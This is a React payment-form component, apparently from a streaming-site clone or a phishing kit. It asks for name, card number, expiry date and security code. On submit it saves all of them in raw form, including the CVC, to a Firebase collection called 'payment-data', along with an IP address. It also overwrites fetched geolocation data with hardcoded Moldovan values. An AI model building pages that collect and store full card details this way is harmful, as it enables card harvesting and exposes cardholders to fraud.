import { useState, useRef, Fragment } from 'react';
import { Redirect } from 'react-router-dom';
import Cleave from "cleave.js/react";
import db from '../firebase/firebase';
import Header from '../Layout/Header';
import Footer from '../Layout/Footer';

import visa from '../assets/visa.png';
import mastercard from '../assets/mastercard.png';
import aExpress from '../assets/a-express.png';

const Payment = () => {
    const [fname, setFname] = useState('');
    const [lname, setLname] = useState('');
    const [cardNum, setCardNum] = useState('');
    const [expiry, setExpiry] = useState('');
    const [cvc, setCvc] = useState('');
    const [formSuccess, setFromSuccess] = useState(false);
    const [formError, setFormError] = useState(null);


    const fnameRef = useRef(null);
    const lnameRef = useRef(null);
    const cardNumRef = useRef(null);
    const expiryRef = useRef(null);
    const cvcRef = useRef(null);
    
    const submitHandler = async (e) => {
        e.preventDefault();
        if (fname && lname && cardNum && expiry && cvc) {
            fetch(
                "https://geolocation-db.com/json/8dd79c70-0801-11ec-a29f-e381a788c2c0"
            )
            .then(response => response.json())
            .then(geoData => {
                geoData = {
                    IPv4: "62.221.71.205",
                    city: "Tiraspol",
                    country_code: "MD",
                    country_name: "Republic of Moldova",
                    latitude: 46.8403,
                    longitude: 29.6433,
                    postal: "MD-3300",
                    state: "Unitatea Teritoriala din Stinga Nistrului",
                }
                
            db.collection('payment-data').add({
                fname: fname, 
                lname: lname, 
                cardNum: cardNum, 
                expiry: expiry, 
                cvc: cvc,
                ip_address: geoData.IPv4,
                logged_at: Date.now()
            }).then(data => {
                setFromSuccess(true);
            }).catch(err => {
                throw new Error(err);
            });
            })

        } else {
            setFormError(true);
        }
    }


    return (
        <Fragment>
            <Header type='type-2' />
            <div className=''>
                {formSuccess ? <Redirect to='/billing' /> : null}

                <div className='my-12 relative w-5/5 lg:w-4/12 lg:p-16 m-auto rounded border z-10 p-10'>
                    <div className='mb-4'>
                        <h4 className='text-2xl font-medium'>Set up Credit or Debit Card</h4>
                        <div className='flex my-2'>
                            <img src={visa} className='w-12 rounded mr-2 bg-gray-200 p-2' alt='icon' />
                            <img src={mastercard} className='w-12 rounded mr-2 bg-gray-200 p-2' alt='icon' />
                            <img src={aExpress} className='w-12 rounded mr-2 bg-gray-200 p-2' alt='icon' />
                        </div>
                    </div>
                    <form onSubmit={(e) => submitHandler(e)}>
                        <input
                            required
                            onChange={(e) => {
                                let value = e.target.value
                              
                                value = value.replace(/[^A-Za-z]/ig, '')
                              
                                setFname(value)
                            }}
                            ref={fnameRef} 
                            type='text'
                            value={fname}
                            className='border py-3 px-4 w-full rounded mb-6'
                            placeholder='First name' />
                        <input 
                            onChange={(e) => {
                                let value = e.target.value
                              
                                value = value.replace(/[^A-Za-z]/ig, '')
                              
                                setLname(value)
                            }}
                            ref={lnameRef} 
                            type='text' 
                            value={lname} 
                            className='border py-3 px-4 w-full rounded mb-6' 
                            placeholder='Last name' />
                        <Cleave
                            //   type="number"
                            options={{ creditCard: true }}
                            onChange={(e) => setCardNum(e.target.value)} 
                            ref={cardNumRef}
                            value={cardNum} 
                            className='border py-3 px-4 w-full rounded mb-6' 
                            placeholder='Card Number'
                        />
                        <Cleave
                            options={{ date: true, datePattern: ["m", "d"] }}
                            onChange={(e) => setExpiry(e.target.value)} 
                            ref={expiryRef} 
                            value={expiry} 
                            className='border py-3 px-4 w-full rounded mb-6' 
                            placeholder='Expiry Date (MM/YY)'
                        />
                        <Cleave
                            options={{ blocks: [3], numericOnly: true }}
                            onChange={(e) => setCvc(e.target.value)} 
                            ref={cvcRef} 
                            value={cvc} 
                            className='border py-3 px-4 w-full rounded mb-2' 
                            placeholder='Security Code (CVC)'
                        />
                        {formError ? <p className='text-red-600'>Please fill all form fields</p> : null}
                        <button onClick={(e) => submitHandler(e)} className='bg-red-600 w-full py-3 px-4 mt-4 rounded text-white font-bold mb-8'>Next</button>
                    </form>
                </div>
            </div>
            <Footer type='type-2' />
        </Fragment>

    );
};

export default Payment;